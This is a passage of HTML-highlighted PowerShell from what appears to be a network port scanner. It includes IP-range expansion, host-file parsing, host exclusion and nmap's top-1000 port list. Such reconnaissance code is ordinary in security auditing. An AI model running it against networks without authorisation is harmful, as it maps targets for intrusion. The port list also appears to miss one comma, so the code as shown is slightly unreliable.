class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-lt</span> <span class="hljs-variable">$Max</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$CurrentIPString</span>)<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHost</span>)<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-ILHosts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$HostFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$HostFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Hosts</span> <span class="hljs-variable">$_</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Exclude-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$excludeHosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$excludeHosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-variable">$hostList</span>.Remove(<span class="hljs-variable">$iHost</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-TopPort</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                [<span class="hljs-type">ValidateRange</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>)]<br>                [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$numPorts</span><br>            )<br><br>            <span class="hljs-comment">#list of top 1000 ports from nmap from Jun 2013</span><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$topPortList</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">80</span>,<span class="hljs-number">23</span>,<span class="hljs-number">443</span>,<span class="hljs-number">21</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span>,<span class="hljs-number">139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">53</span>,<span class="hljs-number">135</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">22</span><br>                        <span class="hljs-number">1723</span>,<span class="hljs-number">111</span>,<span class="hljs-number">995</span>,<span class="hljs-number">993</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">1025</span>,<span class="hljs-number">1720</span>,<span class="hljs-number">548</span>,<span class="hljs-number">113</span>,<span class="hljs-number">81</span>,<span class="hljs-number">6001</span>,<span class="hljs-number">179</span>,<span class="hljs-number">1026</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">8443</span>,<br>                        <span class="hljs-number">8000</span>,<span class="hljs-number">32768</span>,<span class="hljs-number">554</span>,<span class="hljs-number">26</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">49152</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">515</span>,<span class="hljs-number">8008</span>,<span class="hljs-number">49154</span>,<span class="hljs-number">1027</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">646</span>,<span class="hljs-number">5000</span>,<br>                        <span class="hljs-number">5631</span>,<span class="hljs-number">631</span>,<span class="hljs-number">49153</span>,<span class="hljs-number">8081</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">88</span>,<span class="hljs-number">79</span>,<span class="hljs-number">5800</span>,<span class="hljs-number">106</span>,<span class="hljs-number">2121</span>,<span class="hljs-number">1110</span>,<span class="hljs-number">49155</span>,<span class="hljs-number">6000</span>,<span class="hljs-number">513</span>,<br>                        <span class="hljs-number">990</span>,<span class="hljs-number">5357</span>,<span class="hljs-number">49156</span>,<span class="hljs-number">543</span>,<span class="hljs-number">544</span>,<span class="hljs-number">5101</span>,<span class="hljs-number">144</span>,<span class="hljs-number">7</span>,<span class="hljs-number">389</span>,<span class="hljs-number">8009</span>,<span class="hljs-number">9999</span>,<span class="hljs-number">5009</span>,<span class="hljs-number">7070</span>,<span class="hljs-number">5190</span>,<span class="hljs-number">3000</span>,<br>                        <span class="hljs-number">5432</span>,<span class="hljs-number">1900</span>,<span class="hljs-number">3986</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5051</span>,<span class="hljs-number">6646</span>,<span class="hljs-number">49157</span>,<span class="hljs-number">1028</span>,<span class="hljs-number">873</span>,<span class="hljs-number">1755</span>,<span class="hljs-number">2717</span>,<span class="hljs-number">4899</span>,<span class="hljs-number">9100</span>,<br>                        <span class="hljs-number">119</span>,<span class="hljs-number">37</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">5001</span>,<span class="hljs-number">82</span>,<span class="hljs-number">10010</span>,<span class="hljs-number">1030</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">2107</span>,<span class="hljs-number">1024</span>,<span class="hljs-number">2103</span>,<span class="hljs-number">6004</span>,<span class="hljs-number">1801</span>,<br>                        <span class="hljs-number">5050</span>,<span class="hljs-number">19</span>,<span class="hljs-number">8031</span>,<span class="hljs-number">1041</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1048</span>,<span class="hljs-number">1049</span>,<span class="hljs-number">1053</span>,<span class="hljs-number">1054</span>,<span class="hljs-number">1056</span>,<span class="hljs-number">1064</span>,<span class="hljs-number">3703</span>,<span class="hljs-number">17</span>,<span class="hljs-number">808</span>,<span class="hljs-number">3689</span>,<br>                        <span class="hljs-number">1031</span>,<span class="hljs-number">1044</span>,<span class="hljs-number">1071</span>,<span class="hljs-number">5901</span>,<span class="hljs-number">100</span>,<span class="hljs-number">9102</span>,<span class="hljs-number">2869</span>,<span class="hljs-number">4001</span>,<span class="hljs-number">5120</span>,<span class="hljs-number">8010</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">2105</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1038</span>,<br>                        <span class="hljs-number">2601</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7000</span>,<span class="hljs-number">1066</span>,<span class="hljs-number">1069</span>,<span class="hljs-number">625</span>,<span class="hljs-number">311</span>,<span class="hljs-number">280</span>,<span class="hljs-number">254</span>,<span class="hljs-number">4000</span>,<span class="hljs-number">1761</span>,<span class="hljs-number">5003</span>,<span class="hljs-number">2002</span>,<span class="hljs-number">1998</span>,<span class="hljs-number">2005</span>,<br>                        <span class="hljs-number">1032</span>,<span class="hljs-number">1050</span>,<span class="hljs-number">6112</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">2161</span>,<span class="hljs-number">6002</span>,<span class="hljs-number">2401</span>,<span class="hljs-number">902</span>,<span class="hljs-number">4045</span>,<span class="hljs-number">787</span>,<span class="hljs-number">7937</span>,<span class="hljs-number">1058</span>,<span class="hljs-number">2383</span>,<span class="hljs-number">1033</span>,<br>                        <span class="hljs-number">1040</span>,<span class="hljs-number">1059</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">1494</span>,<span class="hljs-number">3</span>,<span class="hljs-number">593</span>,<span class="hljs-number">2301</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">7938</span>,<span class="hljs-number">1022</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1035</span>,<span class="hljs-number">1036</span>,<span class="hljs-number">1037</span>,<br>                        <span class="hljs-number">1074</span>,<span class="hljs-number">8002</span>,<span class="hljs-number">9001</span>,<span class="hljs-number">464</span>,<span class="hljs-number">497</span>,<span class="hljs-number">1935</span>,<span class="hljs-number">2003</span>,<span class="hljs-number">6666</span>,<span class="hljs-number">6543</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1352</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">1111</span>,<span class="hljs-number">407</span>,<span class="hljs-number">500</span>,<br>                        <span class="hljs-number">20</span>,<span class="hljs-number">2006</span>,<span class="hljs-number">1034</span>,<span class="hljs-number">1218</span>,<span class="hljs-number">3260</span>,<span class="hljs-number">15000</span>,<span class="hljs-number">4444</span>,<span class="hljs-number">264</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2004</span>,<span class="hljs-number">1042</span>,<span class="hljs-number">42510</span>,<span class="hljs-number">999</span>,<span class="hljs-number">3052</span>,<span class="hljs-number">1023</span>,<br>                        <span class="hljs-number">222</span>,<span class="hljs-number">1068</span>,<span class="hljs-number">888</span>,<span class="hljs-number">7100</span>,<span class="hljs-number">1717</span>,<span class="hljs-number">992</span>,<span class="hljs-number">2008</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">2007</span>,<span class="hljs-number">8082</span>,<span class="hljs-number">512</span>,<span class="hljs-number">1043</span>,<span class="hljs-number">2009</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">1700</span>,<br>                        <span class="hljs-number">7019</span>,<span class="hljs-number">50001</span>,<span class="hljs-number">4662</span>,<span class="hljs-number">2065</span>,<span class="hljs-number">42</span>,<span class="hljs-number">2602</span>,<span class="hljs-number">3333</span>,<span class="hljs-number">9535</span>,<span class="hljs-number">5100</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">4002</span>,<span class="hljs-number">5002</span>,<span class="hljs-number">1047</span>,<span class="hljs-number">1051</span>,<span class="hljs-number">1052</span>,<br>                        <span class="hljs-number">1055</span>,<span class="hljs-number">1060</span>,<span class="hljs-number">1062</span>,<span class="hljs-number">1311</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">4443</span>,<span class="hljs-number">5225</span>,<span class="hljs-number">5226</span>,<span class="hljs-number">6059</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">8651</span>,<span class="hljs-number">8652</span>,<span class="hljs-number">8701</span>,<span class="hljs-number">9415</span>,<br>                        <span class="hljs-number">9593</span>,<span class="hljs-number">9594</span>,<span class="hljs-number">9595</span>,<span class="hljs-number">16992</span>,<span class="hljs-number">16993</span>,<span class="hljs-number">20828</span>,<span class="hljs-number">23502</span>,<span class="hljs-number">32769</span>,<span class="hljs-number">33354</span>,<span class="hljs-number">35500</span>,<span class="hljs-number">52869</span>,<span class="hljs-number">55555</span>,<span class="hljs-number">55600</span>,<br>                        <span class="hljs-number">64623</span>,<span class="hljs-number">64680</span>,<span class="hljs-number">65000</span>,<span class="hljs-number">65389</span>,<span class="hljs-number">1067</span>,<span class="hljs-number">13782</span>,<span class="hljs-number">366</span>,<span class="hljs-number">5902</span>,<span class="hljs-number">9050</span>,<span class="hljs-number">85</span>,<span class="hljs-number">1002</span>,<span class="hljs-number">5500</span>,<span class="hljs-number">1863</span>,<span class="hljs-number">1864</span>,<br>                        <span class="hljs-number">5431</span>,<span class="hljs-number">8085</span>,<span class="hljs-number">10243</span>,<span class="hljs-number">45100</span>,<span class="hljs-number">49999</span>,<span class="hljs-number">51103</span>,<span class="hljs-number">49</span>,<span class="hljs-number">90</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">1503</span>,<span class="hljs-number">6881</span>,<span class="hljs-number">27000</span>,<span class="hljs-number">340</span>,<span class="hljs-number">1500</span>,<span class="hljs-number">8021</span>,<br>                        <span class="hljs-number">2222</span>,<span class="hljs-number">5566</span>,<span class="hljs-number">8088</span>,<span class="hljs-number">8899</span>,<span class="hljs-number">9071</span>,<span class="hljs-number">5102</span>,<span class="hljs-number">6005</span>,<span class="hljs-number">9101</span>,<span class="hljs-number">163</span>,<span class="hljs-number">5679</span>,<span class="hljs-number">146</span>,<span class="hljs-number">648</span>,<span class="hljs-number">1666</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3476</span>,<span class="hljs-number">5004</span>,<br>                        <span class="hljs-number">5214</span>,<span class="hljs-number">8001</span>,<span class="hljs-number">8083</span>,<span class="hljs-number">8084</span>,<span class="hljs-number">9207</span>,<span class="hljs-number">14238</span>,<span class="hljs-number">30</span>,<span class="hljs-number">912</span>,<span class="hljs-number">12345</span>,<span class="hljs-number">2030</span>,<span class="hljs-number">2605</span>,<span class="hljs-number">6</span>,<span class="hljs-number">541</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1248</span>,<span class="hljs-number">3005</span>,<span class="hljs-number">8007</span>,<br>                        <span class="hljs-number">306</span>,<span class="hljs-number">880</span>,<span class="hljs-number">2500</span>,<span class="hljs-number">1086</span>,<span class="hljs-number">1088</span>,<span class="hljs-number">2525</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">8291</span>,<span class="hljs-number">9009</span>,<span class="hljs-number">52822</span>,<span class="hljs-number">900</span>,<span class="hljs-number">6101</span>,<span class="hljs-number">2809</span>,<span class="hljs-number">7200</span>,<span class="hljs-number">211</span>,<span class="hljs-number">800</span>,<br>                        <span class="hljs-number">987</span>,<span class="hljs-number">1083</span>,<span class="hljs-number">12000</span>,<span class="hljs-number">705</span>,<span class="hljs-number">711</span>,<span class="hljs-number">20005</span>,<span class="hljs-number">6969</span>,<span class="hljs-number">13783</span>,<span class="hljs-number">1045</span>,<span class="hljs-number">1046</span>,<span class="hljs-number">1061</span>,<span class="hljs-number">1063</span>,<span class="hljs-number">1070</span>,<span class="hljs-number">1072</span>,<span class="hljs-number">1073</span>,<br>                        <span class="hljs-number">1075</span>,<span class="hljs-number">1077</span>,<span class="hljs-number">1078</span>,<span class="hljs-number">1079</span>,<span class="hljs-number">1081</span>,<span class="hljs-number">1082</span>,<span class="hljs-number">1085</span>,<span class="hljs-number">1093</span>,<span class="hljs-number">1094</span>,<span class="hljs-number">1096</span>,<span class="hljs-number">1098</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1100</span>,<span class="hljs-number">1104</span>,<span class="hljs-number">1106</span>,<br>                        <span class="hljs-number">1107</span>,<span class="hljs-number">1108</span>,<span class="hljs-number">1148</span>,<span class="hljs-number">1169</span>,<span class="hljs-number">1272</span>,<span class="hljs-number">1310</span>,<span class="hljs-number">1687</span>,<span class="hljs-number">1718</span>,<span class="hljs-number">1783</span>,<span class="hljs-number">1840</span>,<span class="hljs-number">2100</span>,<span class="hljs-number">2119</span>,<span class="hljs-number">2135</span>,<span class="hljs-number">2144</span>,<span class="hljs-number">2160</span>,<br>                        <span class="hljs-number">2190</span>,<span class="hljs-number">2260</span>,<span class="hljs-number">2381</span>,<span class="hljs-number">2399</span>,<span class="hljs-number">2492</span>,<span class="hljs-number">2607</span>,<span class="hljs-number">2718</span>,<span class="hljs-number">2811</span>,<span class="hljs-number">2875</span>,<span class="hljs-number">3017</span>,<span class="hljs-number">3031</span>,<span class="hljs-number">3071</span>,<span class="hljs-number">3211</span>,<span class="hljs-number">3300</span>,<span class="hljs-number">3301</span>,<br>                        <span class="hljs-number">3323</span>,<span class="hljs-number">3325</span>,<span class="hljs-number">3351</span>,<span class="hljs-number">3404</span>,<span class="hljs-number">3551</span>,<span class="hljs-number">3580</span>,<span class="hljs-number">3659</span>,<span class="hljs-number">3766</span>,<span class="hljs-number">3784</span>,<span class="hljs-number">3801</span>,<span class="hljs-number">3827</span>,<span class="hljs-number">3998</span>,<span class="hljs-number">4003</span>,<span class="hljs-number">4126</span>,<span class="hljs-number">4129</span>,<br>                        <span class="hljs-number">4449</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">5269</span>,<span class="hljs-number">5633</span>,<span class="hljs-number">5718</span>,<span class="hljs-number">5810</span>,<span class="hljs-number">5825</span>,<span class="hljs-number">5877</span>,<span class="hljs-number">5910</span>,<span class="hljs-number">5911</span>,<span class="hljs-number">5925</span>,<span class="hljs-number">5959</span>,<span class="hljs-number">5960</span>,<span class="hljs-number">5961</span>,<span class="hljs-number">5962</span>,<br>                        <span class="hljs-number">5987</span>,<span class="hljs-number">5988</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">6123</span>,<span class="hljs-number">6129</span>,<span class="hljs-number">6156</span>,<span class="hljs-number">6389</span>,<span class="hljs-number">6580</span>,<span class="hljs-number">6901</span>,<span class="hljs-number">7106</span>,<span class="hljs-number">7625</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">7911</span>,<span class="hljs-number">8086</span>,<br>                        <span class="hljs-number">8181</span>,<span class="hljs-number">8222</span>,<span class="hljs-number">8333</span>,<span class="hljs-number">8400</span>,<span class="hljs-number">8402</span>,<span class="hljs-number">8600</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8873</span>,<span class="hljs-number">8994</span>,<span class="hljs-number">9002</span>,<span class="hljs-number">9011</span>,<span class="hljs-number">9080</span>,<span class="hljs-number">9220</span>,<span class="hljs-number">9290</span>,<span class="hljs-number">9485</span>,<br>                        <span class="hljs-number">9500</span>,<span class="hljs-number">9502</span>,<span class="hljs-number">9503</span>,<span class="hljs-number">9618</span>,<span class="hljs-number">9900</span>,<span class="hljs-number">9968</span>,<span class="hljs-number">10002</span>,<span class="hljs-number">10012</span>,<span class="hljs-number">10024</span>,<span class="hljs-number">10025</span>,<span class="hljs-number">10566</span>,<span class="hljs-number">10616</span>,<span class="hljs-number">10617</span>,<span class="hljs-number">10621</span>,<br>                        <span class="hljs-number">10626</span>,<span class="hljs-number">10628</span>,<span class="hljs-number">10629</span>,<span class="hljs-number">11110</span>,<span class="hljs-number">13456</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">15002</span>,<span class="hljs-number">15003</span>,<span class="hljs-number">15660</span>,<span class="hljs-number">16001</span>,<span class="hljs-number">16016</span>,<span class="hljs-number">16018</span>,<span class="hljs-number">17988</span>,<br>                        <span class="hljs-number">19101</span>,<span class="hljs-number">19801</span>,<span class="hljs-number">19842</span>,<span class="hljs-number">20000</span>,<span class="hljs-number">20031</span>,<span class="hljs-number">20221</span>,<span class="hljs-number">20222</span>,<span class="hljs-number">21571</span>,<span class="hljs-number">22939</span>,<span class="hljs-number">24800</span>,<span class="hljs-number">25734</span>,<span class="hljs-number">27715</span>,<span class="hljs-number">28201</span>,<br>                        <span class="hljs-number">30000</span>,<span class="hljs-number">30718</span>,<span class="hljs-number">31038</span>,<span class="hljs-number">32781</span>,<span class="hljs-number">32782</span>,<span class="hljs-number">33899</span>,<span class="hljs-number">34571</span>,<span class="hljs-number">34572</span>,<span class="hljs-number">34573</span>,<span class="hljs-number">40193</span>,<span class="hljs-number">48080</span>,<span class="hljs-number">49158</span>,<span class="hljs-number">49159</span>,<br>                        <span class="hljs-number">49160</span>,<span class="hljs-number">50003</span>,<span class="hljs-number">50006</span>,<span class="hljs-number">50800</span>,<span class="hljs-number">57294</span>,<span class="hljs-number">58080</span>,<span class="hljs-number">60020</span>,<span class="hljs-number">63331</span>,<span class="hljs-number">65129</span>,<span class="hljs-number">691</span>,<span class="hljs-number">212</span>,<span class="hljs-number">1001</span>,<span class="hljs-number">1999</span>,<span class="hljs-number">2020</span>,<br>                        <span class="hljs-number">2998</span>,<span class="hljs-number">6003</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">50002</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2033</span>,<span class="hljs-number">3372</span>,<span class="hljs-number">99</span>,<span class="hljs-number">425</span>,<span class="hljs-number">749</span>,<span class="hljs-number">5903</span>,<span class="hljs-number">43</span>,<span class="hljs-number">458</span>,<span class="hljs-number">5405</span>,<span class="hljs-number">6106</span>,<span class="hljs-number">6502</span>,<span class="hljs-number">7007</span>,<br>                        <span class="hljs-number">13722</span>,<span class="hljs-number">1087</span>,<span class="hljs-number">1089</span>,<span class="hljs-number">1124</span>,<span class="hljs-number">1152</span>,<span class="hljs-number">1183</span>,<span class="hljs-number">1186</span>,<span class="hljs-number">1247</span>,<span class="hljs-number">1296</span>,<span class="hljs-number">1334</span>,<span class="hljs-number">1580</span>,<span class="hljs-number">1782</span>,<span class="hljs-number">2126</span>,<span class="hljs-number">2179</span>,<span class="hljs-number">2191</span>,<span class="hljs-number">2251</span>,<br>                        <span class="hljs-number">2522</span>,<span class="hljs-number">3011</span>,<span class="hljs-number">3030</span>,<span class="hljs-number">3077</span>,<span class="hljs-number">3261</span>,<span class="hljs-number">3493</span>,<span class="hljs-number">3546</span>,<span class="hljs-number">3737</span>,<span class="hljs-number">3828</span>,<span class="hljs-number">3871</span>,<span class="hljs-number">3880</span>,<span class="hljs-number">3918</span>,<span class="hljs-number">3995</span>,<span class="hljs-number">4006</span>,<span class="hljs-number">4111</span>,<span class="hljs-number">4446</span>,<br>                        <span class="hljs-number">5054</span>,<span class="hljs-number">5200</span>,<span class="hljs-number">5280</span>,<span class="hljs-number">5298</span>,<span class="hljs-number">5822</span>,<span class="hljs-number">5859</span>,<span class="hljs-number">5904</span>,<span class="hljs-number">5915</span>,<span class="hljs-number">5922</span>,<span class="hljs-number">5963</span>,<span class="hljs-number">7103</span>,<span class="hljs-number">7402</span>,<span class="hljs-number">7435</span>,<span class="hljs-number">7443</span>,<span class="hljs-number">7512</span>,<span class="hljs-number">8011</span>,<br>                        <span class="hljs-number">8090</span>,<span class="hljs-number">8100</span>,<span class="hljs-number">8180</span>,<span class="hljs-number">8254</span>,<span class="hljs-number">8500</span>,<span class="hljs-number">8654</span>,<span class="hljs-number">9091</span>,<span class="hljs-number">9110</span>,<span class="hljs-number">9666</span>,<span class="hljs-number">9877</span>,<span class="hljs-number">9943</span>,<span class="hljs-number">9944</span>,<span class="hljs-number">9998</span>,<span class="hljs-number">10004</span>,<span class="hljs-number">10778</span>,<span class="hljs-number">15742</span>,<br>                        <span class="hljs-number">16012</span>,<span class="hljs-number">18988</span>,<span class="hljs-number">19283</span>,<span class="hljs-number">19315</span>,<span class="hljs-number">19780</span>,<span class="hljs-number">24444</span>,<span class="hljs-number">27352</span>,<span class="hljs-number">27353</span>,<span class="hljs-number">27355</span>,<span class="hljs-number">32784</span>,<span class="hljs-number">49163</span>,<span class="hljs-number">49165</span>,<span class="hljs-number">49175</span>,<br>                        <span class="hljs-number">50389</span>,<span class="hljs-number">50636</span>,<span class="hljs-number">51493</span>,<span class="hljs-number">55055</span>,<span class="hljs-number">56738</span>,<span class="hljs-number">61532</span>,<span class="hljs-number">61900</span>,<span class="hljs-number">62078</span>,<span class="hljs-number">1021</span>,<span class="hljs-number">9040</span>,<span class="hljs-number">666</span>,<span class="hljs-number">700</span>,<span class="hljs-number">84</span>,<span class="hljs-number">545</span>,<span class="hljs-number">1112</span>,<br>                        <span class="hljs-number">1524</span>,<span class="hljs-number">2040</span>,<span class="hljs-number">4321</span>,<span class="hljs-number">5802</span>,<span class="hljs-number">38292</span>,<span class="hljs-number">49400</span>,<span class="hljs-number">1084</span>,<span class="hljs-number">1600</span>,<span class="hljs-number">2048</span>,<span class="hljs-number">2111</span>,<span class="hljs-number">3006</span>,<span class="hljs-number">6547</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">9111</span>,<span class="hljs-number">16080</span>,<br>                        <span class="hljs-number">555</span>,<span class="hljs-number">667</span>,<span class="hljs-number">720</span>,<span class="hljs-number">801</span>,<span class="hljs-number">1443</span>,<span class="hljs-number">1533</span>,<span class="hljs-number">2106</span>,<span class="hljs-number">5560</span>,<span class="hljs-number">6007</span>,<span class="hljs-number">1090</span>,<span class="hljs-number">1091</span>,<span class="hljs-number">1114</span>,<span class="hljs-number">1117</span>,<span class="hljs-number">1119</span>,<span class="hljs-number">1122</span>,<span class="hljs-number">1131</span>,<span class="hljs-number">1138</span>,<br>                        <span class="hljs-number">1151</span>,<span class="hljs-number">1175</span>,<span class="hljs-number">1199</span>,<span class="hljs-number">1201</span>,<span class="hljs-number">1271</span>,<span class="hljs-number">1862</span>,<span class="hljs-number">2323</span>,<span class="hljs-number">2393</span>,<span class="hljs-number">2394</span>,<span class="hljs-number">2608</span>,<span class="hljs-number">2725</span>,<span class="hljs-number">2909</span>,<span class="hljs-number">3003</span>,<span class="hljs-number">3168</span>,<span class="hljs-number">3221</span>,<span class="hljs-number">3322</span>,<br>                        <span class="hljs-number">3324</span>,<span class="hljs-number">3390</span>,<span class="hljs-number">3517</span>,<span class="hljs-number">3527</span>,<span class="hljs-number">3800</span>,<span class="hljs-number">3809</span>,<span class="hljs-number">3814</span>,<span class="hljs-number">3826</span>,<span class="hljs-number">3869</span>,<span class="hljs-number">3878</span>,<span class="hljs-number">3889</span>,<span class="hljs-number">3905</span>,<span class="hljs-number">3914</span>,<span class="hljs-number">3920</span>,<span class="hljs-number">3945</span>,<span class="hljs-number">3971</span>,<br>                        <span class="hljs-number">4004</span>,<span class="hljs-number">4005</span>,<span class="hljs-number">4279</span>,<span class="hljs-number">4445</span>,<span class="hljs-number">4550</span>,<span class="hljs-number">4567</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">4900</span>,<span class="hljs-number">5033</span>,<span class="hljs-number">5080</span>,<span class="hljs-number">5087</span>,<span class="hljs-number">5221</span>,<span class="hljs-number">5440</span>,<span class="hljs-number">5544</span>,<span class="hljs-number">5678</span>,<span class="hljs-number">5730</span>,<br>                        <span class="hljs-number">5811</span>,<span class="hljs-number">5815</span>,<span class="hljs-number">5850</span>,<span class="hljs-number">5862</span>,<span class="hljs-number">5906</span>,<span class="hljs-number">5907</span>,<span class="hljs-number">5950</span>,<span class="hljs-number">5952</span>,<span class="hljs-number">6025</span>,<span class="hljs-number">6510</span>,<span class="hljs-number">6565</span>,<span class="hljs-number">6567</span>,<span class="hljs-number">6689</span>,<span class="hljs-number">6692</span>,<span class="hljs-number">6779</span>,<span class="hljs-number">6792</span>,<br>                        <span class="hljs-number">6839</span>,<span class="hljs-number">7025</span>,<span class="hljs-number">7496</span>,<span class="hljs-number">7676</span>,<span class="hljs-number">7800</span>,<span class="hljs-number">7920</span>,<span class="hljs-number">7921</span>,<span class="hljs-number">7999</span>,<span class="hljs-number">8022</span>,<span class="hljs-number">8042</span>,<span class="hljs-number">8045</span>,<span class="hljs-number">8093</span>,<span class="hljs-number">8099</span>,<span class="hljs-number">8200</span>,<span class="hljs-number">8290</span>,<span class="hljs-number">8292</span>,<br>                        <span class="hljs-number">8300</span>,<span class="hljs-number">8383</span>,<span class="hljs-number">9003</span>,<span class="hljs-number">9081</span>,<span class="hljs-number">9099</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9418</span>,<span class="hljs-number">9575</span>,<span class="hljs-number">9878</span>,<span class="hljs-number">9898</span>,<span class="hljs-number">9917</span>,<span class="hljs-number">10003</span>,<span class="hljs-number">10180</span>,<span class="hljs-number">10215</span>,<span class="hljs-number">11111</span>,<br>                        <span class="hljs-number">12174</span>,<span class="hljs-number">12265</span>,<span class="hljs-number">14441</span>,<span class="hljs-number">15004</span>,<span class="hljs-number">16000</span>,<span class="hljs-number">16113</span>,<span class="hljs-number">17877</span>,<span class="hljs-number">18040</span>,<span class="hljs-number">18101</span>,<span class="hljs-number">19350</span>,<span class="hljs-number">25735</span>,<span class="hljs-number">26214</span>,<span class="hljs-number">27356</span>,<br>                        <span class="hljs-number">30951</span>,<span class="hljs-number">32783</span>,<span class="hljs-number">32785</span>,<span class="hljs-number">40911</span>,<span class="hljs-number">41511</span>,<span class="hljs-number">44176</span>,<span class="hljs-number">44501</span>,<span class="hljs-number">49161</span>,<span class="hljs-number">49167</span>,<span class="hljs-number">49176</span>,<span class="hljs-number">50300</span>,<span class="hljs-number">50500</span>,<span class="hljs-number">52673</span>,<br>                        <span class="hljs-number">52848</span>,<span class="hljs-number">54045</span>,<span class="hljs-number">54328</span>,<span class="hljs-number">55056</span>,<span class="hljs-number">56737</span>,<span class="hljs-number">57797</span>,<span class="hljs-number">60443</span>,<span class="hljs-number">70</span>,<span class="hljs-number">417</span>,<span class="hljs-number">714</span>,<span class="hljs-number">722</span>,<span class="hljs-number">777</span>,<span class="hljs-number">981</span>,<span class="hljs-number">1009</span>,<span class="hljs-number">2022</span>,<span class="hljs-number">4224</span>,<br>                        <span class="hljs-number">4998</span>,<span class="hljs-number">6346</span>,<span class="hljs-number">301</span>,<span 